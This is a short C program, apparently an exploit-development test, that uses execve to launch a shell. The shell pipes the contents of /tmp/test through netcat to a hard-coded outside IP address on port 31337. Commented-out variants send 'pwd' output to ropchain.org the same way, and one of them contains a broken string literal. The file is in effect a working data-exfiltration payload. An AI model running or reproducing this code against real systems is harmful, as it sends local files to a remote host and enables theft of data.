#include <unistd.h>

int main()
{

    //pwd | nc ropchain.org 1234
//    char *argv[] = { "/bin/nc", "  "| ", "/bin/nc", "ropchain.org", "1234", NULL};
//  execve(argv[0], &argv[0], NULL);
    //system("pwd | nc ropchain.org 31337");
//    char *argv[] = {  "/bin/nc", "-nv", "80.86.91.39", "31337", " </tmp/test", NULL};

    char *argv[] = {"/bin/sh", "-c", "/bin/cat /tmp/test | /bin/nc -nv 80.86.91.39 31337", NULL};

    execve(argv[0], &argv[0], NULL);
//    execve("/bin/sh", ["sh", "-c", "pwd | nc ropchain.org 31337"],


}
